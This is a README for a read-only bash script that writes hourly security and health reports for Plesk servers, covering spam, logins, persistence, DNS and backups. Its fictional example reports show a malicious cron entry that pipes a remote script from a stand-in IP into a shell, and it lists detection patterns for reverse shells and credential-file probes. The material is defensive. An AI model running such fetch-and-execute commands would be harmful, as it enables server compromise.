# plesk-server-report

A single bash script that writes an **hourly health and security report** for a Plesk server on Linux and (optionally) uploads it to cloud storage with [rclone](https://rclone.org/) or mails it to you – to a mailbox on the same server, if you like, so the reports never leave it.

It is built around the most common way a shared Plesk server gets into trouble: **a compromised mailbox or a hacked website starts sending spam**, the server IP ends up on a blocklist, and every customer's mail bounces. The report is short plain text you can read yourself – but where it really shines is a daily review by an AI assistant: it reads the latest report and a 24-hour summary every morning and tells you in a few lines whether anything needs your attention. The reports are written for exactly that; see [Reading the reports](#reading-the-reports) for an example prompt. If you host for customers, mind data protection: an AI review means handing personal data to the AI and storage provider – see [Privacy](#privacy-gdpr) for the options, from a local-only setup to pseudonymised uploads.

The script only **reads** logs and system state. It never changes the server configuration, mail queue or websites.

> **Built with Claude.** This script was written together with [Claude](https://claude.ai) (Anthropic) and tested against a production Plesk server. On that server, Claude also reads the uploaded reports every morning as a scheduled task, through a Google Drive connector linked to a dedicated account, and sends a push notification when something needs attention. See [Reading the reports](#reading-the-reports). Findings from these daily reviews flow back into the script, see [Updates](#updates).

## Quick start – no configuration needed

The script works out of the box on a standard Plesk 18 (Obsidian) server on Linux – Debian and Ubuntu, RHEL-based systems (AlmaLinux, Rocky Linux) with a few limits, see [Requirements](#requirements). Plesk for Windows is not supported. Every setting further down has a sensible default; you can ignore them until a report shows you something you want to tune.

```bash
curl -fsSL -o /usr/local/sbin/plesk-server-report.sh \
  https://github.com/cmelius/plesk-monitoring-server-Report/releases/latest/download/plesk-server-report.sh
chmod 700 /usr/local/sbin/plesk-server-report.sh
/usr/local/sbin/plesk-server-report.sh --no-upload        # test run: prints the report
echo '5 * * * * root /usr/local/sbin/plesk-server-report.sh' > /etc/cron.d/plesk-server-report
```

That's it: from now on a report is written every hour to `/var/lib/plesk-server-report/out/`. Three optional extras are worth the few minutes:

1. **Upload** the reports to cloud storage, so you (or an AI assistant) can read them anywhere – [Storage for the reports](#storage-for-the-reports). Without it, the reports stay on the server.
2. **Geolocation** of login IPs: `apt install mmdb-bin` – no configuration needed.
3. **Country alerts:** `echo 'ALLOWED_COUNTRIES="DE AT CH"' >> /etc/plesk-server-report.conf` (your customers' countries).
4. **Mail** instead of (or besides) the upload: `echo 'REPORT_MAIL_TO="admin@example.com"' >> /etc/plesk-server-report.conf` – ideally a mailbox on this server, so the reports never leave it – a daily summary and a mail as soon as something new is wrong. Put the sender on the spam filter whitelist, see [Reports by mail](#reports-by-mail).

The sections below explain everything in detail; you don't need to read them to get started.

**Young project, frequent updates:** new checks and fixes come out every few days at the moment. The daily report tells you when a newer release is available; *Watch → Custom → Releases* on GitHub notifies you as well. See [Updates](#updates).

**Contents:** [What it found so far](#what-it-found-so-far) · [What the report covers](#what-the-report-covers) · [Requirements](#requirements) · [Installation](#installation) · [Storage for the reports](#storage-for-the-reports) · [Reports by mail](#reports-by-mail) · [Reading the reports](#reading-the-reports) · [What the script remembers](#what-the-script-remembers) · [Configuration](#configuration) · [First run](#first-run) · [Notes and limitations](#notes-and-limitations) · [Security](#security) · [Privacy](#privacy-gdpr) · [Using another CMS?](#using-another-cms-help-wanted) · [Updates](#updates) · [License](#license)

---

## What it found so far

On the author's production server (Plesk, about 40 customer domains), the first days of reports turned up real problems that had gone unnoticed for months or years:

- **A public backup archive in a customer's website.** A `backup.zip` in the document root was reachable from anywhere – and the access logs showed it being downloaded by scanners.
- **Leftover installer directories** of a forum software, including `phpinfo.php` files that exposed the full PHP configuration.
- **A forgotten `phpinfo.php`** in a directory renamed to "…_DEACTIVATED", still served to anyone.
- **Old database dumps and backup archives** in document roots: UpdraftPlus backups, `wp-config.php` copies and SQL dumps from 2020/2021. Blocked by the web server, but sitting where one wrong rule would expose them.
- **An outdated DKIM key:** the key had been regenerated in Plesk, but the DNS record at the customer's registrar still had the old one, so DKIM failed for every mail.
- **A mail domain with neither SPF nor DKIM**, so its mails were likely rejected or landed in spam. Its DNS is managed by the customer, which is why nobody had noticed.
- **An abandoned WordPress installation** in a site's root, producing PHP errors on every request.
- **Domains that no longer belong on the server:** websites moved to other hosts, parked domains without DNS. These were candidates for cleanup.
- **A targeted login attempt** on the operator's own mailboxes from an unknown IP, among the usual brute-force noise.
- **A distributed WordPress brute-force attack**, which led to the detailed login-attack section: distinct IPs, wp-login vs. xmlrpc, and successful logins after failures.

Just as useful: the reports confirmed what is *fine*. Reverse DNS, HELO name and mail server certificates were correct, backups ran, and no mailbox was sending spam.

---

## What the report covers

**Hourly (only log lines written since the previous run):**

| Area | Checks | Alerts when … |
|---|---|---|
| **Outgoing mail / spam** | recipients per sender, mails per authenticated mailbox, distinct client IPs per mailbox, **login ≠ sender domain**, mails injected by scripts (PHP `mail()`, per Plesk subscription), **mail sent through Roundcube webmail** (mailbox, real client IP, recipients), failed webmail logins, deferred/bounced, queue size | a mailbox suddenly sends a lot, is used from many IPs, sends with foreign `From` domains, a website's scripts send mass mail, or a webmail user sends after repeated failed logins |
| **Reputation** | server IP against Spamhaus, SpamCop, Barracuda, PSBL; remote rejections mentioning blocklists, reputation, spam or rate limits (including the wording of Gmail, Microsoft, Apple iCloud, Yahoo, GMX/web.de and T-Online, e.g. "likely unsolicited", "unusual rate", "local policy" [CS01]/[HM08], "excessive volume", "policy restrictions", DMARC rejections), with examples; mails the spam filter skipped because of their size; **outgoing deliveries per provider** (sent / deferred / bounced for Microsoft, Google, Apple, GMX/web.de/IONOS, T-Online, …) and **watched recipient domains** | the server IP is listed, recipients reject or throttle mail because of reputation, or a delivery to a watched domain fails |
| **Brute force** | failed SMTP/IMAP/POP3 logins, most attacked mailboxes, fail2ban jails | failures spike, or a jail bans an IP that logged in successfully before (a customer's device with an outdated password) |
| **Intrusion** | successful SSH and Plesk panel logins, **new PHP files in `wp-content/uploads`**, **successful WordPress logins during a brute-force attack** | a login comes from a never-seen IP, a PHP file appears in an upload folder, or an IP logs in to WordPress after repeated failures |
| **Access & persistence** | what an attacker leaves behind: **SSH keys** in every account's `authorized_keys`, accounts with a login shell or UID 0, members of `sudo`/`wheel`/`admin`, sudoers files, `/etc/ld.so.preload`, **cron jobs** (customer crontabs, root, `/etc/cron.*`) and autostart files (`rc.local`, systemd units in `/etc`), **processes** running from `/tmp`, `/dev/shm` or a web folder, from a deleted file or from memory only, or posing as a kernel thread, **listening TCP ports** | a key, account, sudo right or port is new or changed, a cron job or autostart file contains a download piped into a shell, base64 decoding, a reverse shell or a program in `/tmp`, root or the system gets a new cron entry, or a suspicious process runs. Compared with the previous run, read only |
| **Geolocation** (optional) | country and network operator of every IP with a successful login (mailboxes, SSH, Plesk panel, WordPress) and of the top failed-login IPs, datacenter networks marked, from a **local** database, so no IP leaves the server | a mailbox sends mail, is read via IMAP/POP3, or someone logs in, from a country outside `ALLOWED_COUNTRIES` |
| **System** | load, CPU per system user (= subscription), RAM, disks, failed systemd units, OOM killer | thresholds are exceeded |
| **Backups** | time, age and status of the latest **Plesk backup** (errors from its `backup.log`), Acronis agent (if installed) | the latest backup is older than `WARN_BACKUP_HOURS` or finished with errors, or the Acronis agent is not running |
| **Web** | requests, 5xx errors, WordPress login POSTs and busiest IP per domain, login-attack details (distinct IPs, wp-login vs. xmlrpc, successful logins, whether xmlrpc.php is blocked), PHP fatal errors with the first message, **attack patterns** per domain (SQL injection, path traversal, code execution, XSS) and how many were answered with 200, **probes for sensitive files** (`.env`, `.git`, dumps, backups, config copies), **traffic peaks** (busiest minute) and URLs requested by unusually many IPs, **ModSecurity** hits and top rules | a domain throws many 5xx/fatal errors, a sensitive file was served with 200 *and* exists on disk, a traffic peak exceeds `WARN_REQ_PER_MIN`, or one URL is hit by a botnet-sized number of IPs |

**Once a day (first run after midnight):** pending (security) updates and reboot-required, whether a newer release of this script is available, TLS certificates of all Plesk domains and the panel (expiry < 14 days), **HSTS and http→https redirect** on every domain with a valid certificate (a recommendation, no alert), and **SPF, DKIM and DMARC of every domain with mail service**: does SPF allow this server (including `include:`, `a`, `mx`), does the DKIM key in DNS match the key Plesk signs with, is there a DMARC policy, and where are MX and DNS hosted. That last part is especially useful for domains whose DNS you don't manage yourself. SPF errors that make receivers reject mail outright are flagged too: several SPF records, more than 10 DNS lookups, or `+all`.

**Also once a day, server and domain DNS:**
- **reverse DNS (PTR)** of the server IP, forward-confirmed, and whether Postfix's HELO name resolves to the server. Without a PTR record, Gmail, Microsoft and others reject mail from *all* domains on the server.
- **IPv6** (automatic, only if the server has a global IPv6 address and Postfix uses it): PTR for IPv6, and SPF also evaluated for the IPv6 address
- **certificates of the mail server** on ports 25/587 (STARTTLS), 465, 993 and 995: valid for the host name mail clients use (`MAIL_TLS_NAME`, default: the server's host name), and expiry
- per Plesk domain: does the website **still point to this server** (moved domains, CDNs), does a **CAA** record block Let's Encrypt renewals, does the domain resolve at all (**broken DNSSEC**, dead name servers), and is the domain **listed on Spamhaus DBL / SURBL** (typical for hacked sites serving phishing)

### Example report (fictional data)

```
Server report host.example.com – 2026-10-26 10:05 UTC – plesk-server-report v1.5.0
STATUS: WARNING (13)
 ! Mail: support@bank-secure.example sent to 700 recipients from this server (mailbox login or script)
 ! Mail: mailbox info@shop.example submitted 140 mails after logins from outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter]) 203.0.113.99 (VN, Example Telecom) – password compromised?
 ! Mail: mailbox info@shop.example used from 12 different IPs – password compromised?
 ! Mail: mailbox info@shop.example sent 140 mails with a foreign sender domain – spam?
 ! Mail: 61 rejections by remote servers mentioning a blocklist, reputation, spam or rate limit – check the server IP and the examples
 ! Mail: mailbox info@shop.example logged in via IMAP/POP3 from a new country outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter], 48.3 MB of mail read) – travelling, or password compromised?
 ! fail2ban: jail plesk-courierimap bans 198.51.100.77 (DE, Example Kabel GmbH), which had successful logins before (mail logins of office@lawfirm.example (last 2026-10-25)) – a device with an outdated password? Unban: fail2ban-client set plesk-courierimap unbanip 198.51.100.77
 ! Web: blog.example logged 48 PHP fatal errors
 ! Web: shop.example served the sensitive file /.env (HTTP 200, file exists) – remove it or block access; assume it was downloaded
 ! Web: 2 new PHP file(s) in wp-content/uploads – possible malware
 ! Cron: new entry with suspicious content in crontab of shop_web: */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh – check it
 ! Updates: 3 security update(s) pending
 ! Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access

== MAIL ==
Source: /var/log/maillog, 5212 new lines
Delivered: 548 | deferred: 87 | bounced: 34 | queue: 4
Rejections mentioning blocklist/reputation/spam/rate limit: 61
  example: Oct 26 09:41:12 gmail.com: host gmail-smtp-in.l.google.com[192.0.2.26] said: 421-4.7.28 [203.0.113.10] Gmail has detected an unusual rate of unsolicited mail originating from your IP address. To protect our users from spam, mail sent from your IP addr
  example: Oct 26 09:44:03 outlook.com: host outlook-com.olc.protection.outlook.com[192.0.2.40] said: 451 4.7.650 The mail server [203.0.113.10] has been temporarily rate limited due to IP reputation. (in reply to MAIL FROM command))
  example: Oct 26 09:52:37 icloud.com: host mx01.mail.icloud.com[192.0.2.61] said: 550 5.7.1 Your message was rejected due to icloud.com's local policy [CS01] (in reply to end of DATA command))
Outgoing deliveries per provider (sent / deferred / bounced):
  google                   310 / 52 / 18
  microsoft                141 / 29 / 11
  gmx/web.de/ionos          47 / 0 / 2
  apple icloud              12 / 6 / 3
  t-online                   9 / 0 / 0
  mailhost.example           6 / 0 / 0
Watched recipient domain invoices.example.com: 3 sent, 0 deferred, 0 bounced
Spam filter: all mails scanned – none above the size limit (limit 3.0 MB = 3145728 bytes, Plesk: SA_MAX_MAIL_SIZE in /etc/psa/psa.conf)
DNS blocklists for 203.0.113.10: zen.spamhaus.org:clean bl.spamcop.net:clean b.barracudacentral.org:clean psbl.surriel.com:clean

Top senders (total recipients):
     700  support@bank-secure.example
      12  office@agency.example
       6  <> (bounce)
       4  newsletter@shop.example

Authenticated mailboxes (mails, distinct IPs; IPs with country/operator, mails per IP):
     140  12 IPs  info@shop.example
          192.0.2.15 (BR, Example Cloud Ltd [datacenter]) ×61, 203.0.113.99 (VN, Example Telecom) ×40, 192.0.2.201 (BR, Example Cloud Ltd [datacenter]) ×20, 198.51.100.4 (DE, Example Telekom AG) ×3, …
       9   1 IPs  office@agency.example
          198.51.100.20 (DE, Example Telekom AG) ×9
       3   1 IPs  jane@lawfirm.example
          198.51.100.44 (AT, Example Kabel GmbH) ×3

IMAP/POP3 logins (logins, mailbox, IP) from outside ALLOWED_COUNTRIES:
      14  info@shop.example  from 192.0.2.15 (BR, Example Cloud Ltd [datacenter])  – 48.3 MB of mail read  – first login from BR
       6  jane@lawfirm.example  from 198.51.100.90 (ES, Example Movil S.A.)  – 312 KB of mail read
  (86 logins of 23 mailboxes from 31 IPs checked)

Mailboxes sending with a foreign sender domain (login ≠ from):
     140  info@shop.example – e.g. support@bank-secure.example

Mails sent by scripts (system user = subscription):
       4  uid 10012  shopexample  /var/www/vhosts/shop.example
       2  uid 30  popuser  /var/qmail/popuser
       1  uid 999  psaadm  /opt/psa/admin

Failed mail logins: SMTP 64 | IMAP/POP3 3 – top IPs:
       9  192.0.2.200 (NL, Example Hosting B.V. [datacenter])
       3  198.51.100.66 (US, Example Cloud Ltd [datacenter])
       1  203.0.113.45 (CN, Example Telecom)
Most attacked mailboxes (failed SMTP/IMAP/POP3 logins):
       8  admin@agency.example
       4  info@lawfirm.example
       3  jane

Webmail (Roundcube) – mails sent (mails, recipients, IPs):
       4      5 rcpt   1 IPs  office@agency.example
          198.51.100.20 (DE, Example Telekom AG) ×4
Failed webmail logins: 12 – top IPs:
       7  192.0.2.200 (NL, Example Hosting B.V. [datacenter])
       2  203.0.113.80 (US, Example Cable Inc.)
Most attacked mailboxes (failed webmail logins):
       9  info@lawfirm.example
       3  admin@agency.example

== SYSTEM ==
Load: 0.42 / 0.37 / 0.30 (1/5/15 min) on 8 cores | up 12 days, 4 hours, 10 minutes
%Cpu(s):  3.1 us,  1.0 sy,  0.0 ni, 95.6 id,  0.2 wa,  0.0 hi,  0.1 si,  0.0 st

CPU per system user (snapshot):
    12.9 %  shopexample
     4.2 %  mysql
     2.1 %  root

Top processes:
    8.6 %  shopexample  php-fpm
    4.2 %  mysql        mariadbd
    4.3 %  shopexample  php-fpm
    1.3 %  root         fail2ban-server

RAM: 11240 of 16000 MB available (70 %) | swap used: 0/2047 MB

Filesystems:
   41%  /
    8%  /boot/efi

== FAIL2BAN ==
  plesk-courierimap            banned:   9 (total 87), currently failed: 136
  plesk-modsecurity            banned:  15 (total 612), currently failed: 31
  plesk-postfix                banned:   2 (total 221), currently failed: 174
  plesk-wordpress              banned:   0 (total 114), currently failed: 4
  recidive                     banned: 286 (total 561), currently failed: 242
  ssh                          banned:   5 (total 1251), currently failed: 20
  (jails without bans/failures hidden)
  Banned IPs with earlier successful logins (customer or own device with an outdated password?):
    plesk-courierimap: 198.51.100.77 (DE, Example Kabel GmbH) – earlier successful mail logins of office@lawfirm.example (last 2026-10-25)

== WEB (since last run) ==
requests | 5xx | login POSTs | domain | busiest IP
      562     2      0  shop.example  198.51.100.30 (472)
      310    51      0  blog.example  192.0.2.80 (40)
      188     0    122  agency.example  203.0.113.150 (160)
       95     0      0  lawfirm.example  198.51.100.12 (23)

WordPress login attacks (domains with at least 20 login POSTs):
  agency.example: 122 POSTs from 54 IPs (busiest 203.0.113.150 (20))
    wp-login.php: 80, successful (302): 1 | xmlrpc.php: 42, blocked (4xx): 0 – xmlrpc.php is NOT blocked
    successful wp-login from: 198.51.100.200 (DE, Example Telekom AG), 0 failures before

PHP fatal errors (count, domain, first message):
     48  blog.example – Uncaught Error: Call to undefined function create_function() in /var/www/vhosts/blog.example/httpdocs/wp-content/plugins/old-slider/slider.php:12

Attack patterns & sensitive-file probes (count, of which answered 200):
  shop.example               SQLi 14/0 | traversal 6/0 | code exec 3/0 | XSS 2/0 | sensitive files 41/1
      served with 200 AND present on disk: /.env
  blog.example               SQLi 0/0 | traversal 2/0 | code exec 0/0 | XSS 0/0 | sensitive files 17/0

Traffic peaks & distributed requests (busiest minute; URL requested by most different IPs):
  agency.example             peak 212 req/min at 04:07 | /wp-login.php from 54 IPs

ModSecurity (hits, of which blocked; top rules):
      31     29  shop.example – 942100 SQL Injection Attack Detected via libinjection ×18; 930120 OS File Access Attempt ×9

== WEBROOTS: PHP files in upload folders ==
New since last run: 2
  /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/cache.php
  /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/wp-tmp.php

== SUCCESSFUL LOGINS (SSH, Plesk panel) ==
     2× SSH   root           from 198.51.100.200   (publickey)  DE, Example Telekom AG
     1× Plesk -              from 198.51.100.200   (panel, user not logged)  DE, Example Telekom AG
  Plesk panel: 7 failed login attempt(s) (fail2ban jail plesk-panel)

== ACCESS & PERSISTENCE (SSH keys, accounts, sudo, cron, autostart, processes, ports) ==
SSH keys (authorized_keys): 2 key(s) of 1 account(s)
Accounts with a login shell: 2 | sudo group members: 1 | sudoers files: 1
Cron jobs: 38 entr(y/ies) | autostart files (cron.hourly…monthly, rc.local, systemd units in /etc): 17
  ! cron (crontab of shop_web): */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh
Processes: 284 checked, 0 suspicious (program in /tmp, /dev/shm or a web folder, deleted, memory only, fake kernel thread)
Listening TCP ports (not loopback): 21 xinetd, 22 sshd, 25 master, 53 named, 80 nginx, 110 couriertcpd, 143 couriertcpd, 443 nginx, 465 master, 587 master, 993 couriertcpd, 995 couriertcpd, 8443 sw-cp-serverd, 8880 sw-cp-serverd

== SERVICES ==
Failed units: none
OOM killer: none

== BACKUPS ==
Plesk backup: last run 2026-10-26 03:15 UTC (6 h ago, backup-2026-10-26-03-15-02-123), status: OK (exit code 0)
Acronis agent: running

== DAILY CHECKS ==
As of: 2026-10-26 01:05 UTC
Updates available: 11, security updates: 3
  libssl3t64
  openssl
  openssh-server
Script version: 1.7.0 (latest release)

TLS certificates:
  all valid certificates are good for at least 14 more days
  no matching certificate (e.g. no SSL, mail-only, redirect): mail-only.example parked.example

HTTPS (HSTS and http→https redirect; domains with a valid certificate that point here):
  no HSTS: lawfirm.example
  no redirect from http to https: lawfirm.example
  security can be improved (Plesk: Websites & Domains → SSL/TLS Certificates → HSTS / Redirect from http to https)
  23 domain(s) checked

Server DNS (reverse DNS / HELO):
  203.0.113.10 → host.example.com: ok (forward-confirmed)
  Postfix HELO name: host.example.com (resolves to this server, matches PTR)
  IPv6: not used for mail (CHECK_IPV6=auto)

Mail server certificates for host.example.com:
  port 25: name ok, valid 61 more days
  port 465: name ok, valid 61 more days
  port 587: name ok, valid 61 more days
  port 993: name ok, valid 61 more days
  port 995: name ok, valid 61 more days

Domain DNS (points here? CAA, DNSSEC, domain blocklists):
  moved.example: website points elsewhere (192.0.2.77, NL, Example Hosting B.V. [datacenter]) – moved? CDN?
  39 domain(s) checked, findings listed above

Exposed files in document roots (.env, .git, dumps, backups, config copies, info/admin tools):
  shop.example/.env – PUBLICLY REACHABLE (HTTP 200)
  shop.example: 1 file(s) found but blocked by the web server (HTTP 403), e.g. /.git/
  42 document root(s) scanned, 2 finding(s); only publicly reachable ones raise an alert

Suspicious code in recently changed PHP files (typical webshell/backdoor patterns):
  42 document root(s) scanned, 0 suspicious file(s)

Mail authentication (SPF / DKIM / DMARC):
  nails.example                SPF pass      | DKIM MISSING  | DMARC missing      | MX here | DNS ns1.other-provider.example
  38 domain(s) OK, 1 with findings. Alert only if SPF and DKIM both fail and the MX points here;
  a single missing/outdated record is a recommendation (DMARC passes if SPF or DKIM passes).
  DNS queried via 1.1.1.1

IP geolocation: DB-IP.com Lite databases (CC BY 4.0)
```

The report above is what a hijacked mailbox and a hacked WordPress site look like: one mailbox, read via IMAP from a Brazilian datacenter for the first time and used from twelve different IPs, suddenly sends 140 mails to 700 recipients pretending to be a bank. Gmail, Microsoft and Apple start throttling and rejecting the server's mail – for every customer on it. Two PHP files show up in the uploads folder of the same customer, a new cron job of that site downloads and runs a script every ten minutes – deleting the PHP files alone would not stop it – and that site's `.env` file with its database password can be downloaded by anyone. The second IMAP line (Spain) raises no alert: that mailbox has been seen there before, someone on holiday.

<details>
<summary><b>Example <code>summary.txt</code></b> (the same day, condensed from all reports of the last 24 hours – 24 with the hourly cron job, 12 if it runs every 2 hours; fictional data, shortened)</summary>

```
Server summary host.example.com – last 24 h: 24 report(s), 2026-10-25 11:05 UTC to 2026-10-26 10:05 UTC – plesk-server-report v1.5.0
Built from the reports of this period. Daily checks and fail2ban: see latest.txt. Details of a run: report-<date>-<time>.txt

== RUNS (time, status) ==
  2026-10-25 11:05 UTC  STATUS: OK
  2026-10-25 12:05 UTC  STATUS: OK
  …
  2026-10-26 00:05 UTC  STATUS: OK
  2026-10-26 01:05 UTC  STATUS: WARNING (2)
  …
  2026-10-26 09:05 UTC  STATUS: WARNING (5)
  2026-10-26 10:05 UTC  STATUS: WARNING (13)

== ALERTS (times seen, first – last, text) ==
   10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Updates: 3 security update(s) pending
   10×  2026-10-26 01:05 UTC – 2026-10-26 10:05 UTC  Web: shop.example exposes /.env publicly (HTTP 200) – remove it from the document root or block access
    6×  2026-10-26 05:05 UTC – 2026-10-26 10:05 UTC  fail2ban: jail plesk-courierimap bans 198.51.100.77 (DE, Example Kabel GmbH), which had successful logins before (mail logins of office@lawfirm.example (last 2026-10-25)) – a device with an outdated password? Unban: fail2ban-client set plesk-courierimap unbanip 198.51.100.77
    1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example used from 5 different IPs – password compromised?
    1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example sent 23 mails with a foreign sender domain – spam?
    1×  2026-10-26 09:05 UTC – 2026-10-26 09:05 UTC  Mail: mailbox info@shop.example logged in via IMAP/POP3 from a new country outside DE AT CH: 192.0.2.15 (BR, Example Cloud Ltd [datacenter], 48.3 MB of mail read) – travelling, or password compromised?
    1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  Mail: support@bank-secure.example sent to 700 recipients from this server (mailbox login or script)
    1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  Mail: 61 rejections by remote servers mentioning a blocklist, reputation, spam or rate limit – check the server IP and the examples
    …

== MAIL ==
Delivered: 2276 | deferred: 91 | bounced: 36 | highest queue: 4 (2026-10-26 10:05 UTC)
Rejections mentioning blocklist/reputation/spam/rate limit: 61
  example (2026-10-26 10:05 UTC): Oct 26 09:41:12 gmail.com: host gmail-smtp-in.l.google.com[192.0.2.26] said: 421-4.7.28 [203.0.113.10] Gmail has detected an unusual rate of unsolicited mail …
  example (2026-10-26 10:05 UTC): Oct 26 09:44:03 outlook.com: host outlook-com.olc.protection.outlook.com[192.0.2.40] said: 451 4.7.650 The mail server [203.0.113.10] has been temporarily rate limited …
Outgoing deliveries per provider (total sent / deferred / bounced):
  google                  1104 / 53 / 19
  microsoft                512 / 31 / 11
  gmx/web.de/ionos         301 / 1 / 2
  t-online                  88 / 0 / 0
  apple icloud              41 / 6 / 4
  mailhost.example          37 / 0 / 0
Watched recipient domain invoices.example.com: 21 sent, 0 deferred, 0 bounced
Spam filter: all mails scanned (limit 3.0 MB = 3145728 bytes)
DNS blocklists for the server IP: not listed in any run

Authenticated mailboxes (mails in total; every client IP seen):
     163  info@shop.example
          198.51.100.4 (DE, Example Telekom AG) ×3
          192.0.2.15 (BR, Example Cloud Ltd [datacenter]) ×12, 203.0.113.99 (VN, Example Telecom) ×8, …
          192.0.2.15 (BR, Example Cloud Ltd [datacenter]) ×61, 203.0.113.99 (VN, Example Telecom) ×40, …
      87  office@agency.example
          198.51.100.20 (DE, Example Telekom AG) ×87

IMAP/POP3 logins from outside the allowed countries (time; logins, mailbox, IP):
  2026-10-26 09:05 UTC  9  info@shop.example  from 192.0.2.15 (BR, Example Cloud Ltd [datacenter])  – 48.3 MB of mail read  – first login from BR
  2026-10-26 10:05 UTC  14  info@shop.example  from 192.0.2.15 (BR, Example Cloud Ltd [datacenter])  – 2.1 MB of mail read
  …

Mailboxes sending with a foreign sender domain (login ≠ from):
  2026-10-26 09:05 UTC  23  info@shop.example – e.g. support@bank-secure.example
  2026-10-26 10:05 UTC  140  info@shop.example – e.g. support@bank-secure.example

Failed mail logins: SMTP 1312 | IMAP/POP3 41 in total, most in one run: 118 (2026-10-26 03:05 UTC)
…

== SYSTEM ==
Highest 5-min load: 2.84 (2026-10-26 03:05 UTC) on 8 cores | lowest available RAM: 61 % (2026-10-26 03:05 UTC)
…
Backups (newest report):
  Plesk backup: last run 2026-10-26 03:15 UTC (6 h ago, backup-2026-10-26-03-15-02-123), status: OK (exit code 0)
  Acronis agent: running

== WEBROOTS: PHP files in upload folders ==
New in this period: 2
  2026-10-26 10:05 UTC  /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/cache.php
  2026-10-26 10:05 UTC  /var/www/vhosts/shop.example/httpdocs/wp-content/uploads/2026/10/wp-tmp.php

== SUCCESSFUL LOGINS (SSH, Plesk panel; count, first – last) ==
     9×  2026-10-25 14:05 UTC – 2026-10-26 10:05 UTC  SSH   root           from 198.51.100.200   (publickey)  DE, Example Telekom AG
     2×  2026-10-26 08:05 UTC – 2026-10-26 10:05 UTC  Plesk -              from 198.51.100.200   (panel, user not logged)  DE, Example Telekom AG

== ACCESS & PERSISTENCE (changes + − ~ and findings !; count, first – last) ==
     1×  2026-10-26 10:05 UTC – 2026-10-26 10:05 UTC  ! cron (crontab of shop_web): */10 * * * * curl -fsSL http://203.0.113.66/u.sh | sh
```

The summary shows what a single report can't: the first signs at 09:05 (the first IMAP login from Brazil, five IPs, 23 mails with a foreign sender), the escalation an hour later with the big providers throttling the server, and that the exposed `.env` had been reported since the daily check at 01:05.

</details>

---

## Requirements

- Plesk Obsidian on Linux with Postfix and Dovecot or Courier for IMAP/POP3 – Plesk lets you choose; both log formats are recognized automatically (tested on Debian; Ubuntu should work the same; RHEL-based systems are partially supported: the daily check for pending OS updates uses `dnf` instead of `apt-get` and reports security updates only, SSH logins are read from `/var/log/secure`). The script itself is installed and updated with `curl` on every system, see [Quick start](#quick-start--no-configuration-needed).
- root access, `bash`, `awk`, `openssl`, `procps` (`top`, `free`) – all present on a standard Plesk server
- optional: `fail2ban` (Plesk component), `rclone` for the upload, `mmdblookup` for geolocation (see below)

---

## Installation

```bash
# latest release (recommended)
curl -fsSL -o /usr/local/sbin/plesk-server-report.sh \
  https://github.com/cmelius/plesk-monitoring-server-Report/releases/latest/download/plesk-server-report.sh
chmod 700 /usr/local/sbin/plesk-server-report.sh

# read it before you run it as root
less /usr/local/sbin/plesk-server-report.sh

# optional, recommended: geolocation of login IPs
apt install mmdb-bin            # RHEL-based: dnf install libmaxminddb (EPEL)

# first test run: prints the report, uploads and mails nothing
/usr/local/sbin/plesk-server-report.sh --no-upload
```

Options: `--no-upload` (print instead of upload), `--only CHECK,…` (run single checks, see [First run](#first-run)), `--summary` (print the 24-hour summary from the stored reports), `--list` (check names), `--version`, `--help`.

**Releases or `main`?** The [releases](../../releases) are tested versions that have been running on the author's server for a while. `main` gets every change as soon as it is made. To follow `main`, use `https://raw.githubusercontent.com/cmelius/plesk-monitoring-server-Report/main/plesk-server-report.sh` instead. The first line of every report shows the version.

**Geolocation:** with `mmdblookup` installed, the script downloads the free [DB-IP Lite](https://db-ip.com/db/lite.php) country and ASN databases (a few MB each) on the first run into `/var/lib/plesk-server-report/geoip` and refreshes them once a month. This needs outbound HTTPS to `download.db-ip.com`. Lookups are done locally, so no IP address is sent to any service. Without `mmdblookup` the script works as before and says so at the end of the report. To get **alerts**, set your customers' countries (see [Configuration](#configuration)):

```bash
echo 'ALLOWED_COUNTRIES="DE AT CH"' >> /etc/plesk-server-report.conf
```

The **first run** reads the last 20,000 lines of each log and lists all existing PHP files in upload folders, so it may contain warnings about older events. Review them once (see [First run](#first-run)). From the second run on, only new lines are analysed.

Then set up the storage (next section) and the cron job:

```bash
echo '5 * * * * root /usr/local/sbin/plesk-server-report.sh' > /etc/cron.d/plesk-server-report
chmod 644 /etc/cron.d/plesk-server-report
```

---

## Storage for the reports

> ### ⚠️ Use a dedicated account
> Reports contain **IP addresses, mailbox names and email addresses** – personal data (GDPR!) and a map of your server's weak spots. Create a **separate account or bucket used only for these reports**, not your personal or company drive. This way:
> - a stolen rclone token on the server only exposes the reports,
> - anything (human or AI assistant) you give read access to sees the reports and nothing else,
> - you can delete everything in one go.
>
> Never share the folder with "anyone with the link".
>
> **No AI review? Then your own account can be fine,** as long as the token on the server is limited to the report files and the folder is never shared:
> - **Google Drive with scope `drive.file`:** rclone only sees files it created itself. A stolen token exposes the reports, not the rest of your drive. A folder in your own account is acceptable.
> - **S3/B2 with a bucket-limited key, or SFTP with a chrooted user:** same, the key only reaches the report bucket or directory.
> - **OneDrive or Nextcloud/WebDAV:** the token or app password usually grants access to the **whole** account. Keep a dedicated account here.
>
> As soon as an AI assistant (or anyone else) gets read access, use a dedicated account. Connectors typically see the entire account, not just one folder.

The upload target is the rclone remote in `REMOTE` (default `reports:server-reports/<hostname>`). After every run the script uploads `report-YYYYMMDD-HHMM.txt`, overwrites `latest.txt` and deletes reports older than `RETENTION_DAYS` (default 7). Set `REMOTE=""` to keep reports only locally (in `/var/lib/plesk-server-report/out`).

Install rclone with `apt install rclone` (Debian/Ubuntu) or `dnf install rclone` (RHEL-based, from EPEL). If your distribution's version is very old, see [rclone.org/install](https://rclone.org/install/).

### Option A: Google Drive (headless server)

1. Create a new Google account just for the reports.
2. On the server run `rclone config` and answer:

